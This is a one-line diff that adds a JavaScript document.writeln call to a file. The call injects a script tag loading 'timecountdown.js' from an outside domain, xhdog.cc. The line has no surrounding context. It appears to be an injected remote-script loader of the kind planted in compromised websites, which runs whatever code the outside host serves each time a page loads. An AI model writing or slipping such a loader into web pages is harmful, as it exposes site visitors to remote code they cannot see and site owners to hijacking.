@@ -1,0 +1,1 @@
+document.writeln("<script type=\'text/javascript\' src=\'https://www.xhdog.cc/hot/zq-11/timecountdown.js\'></script>");
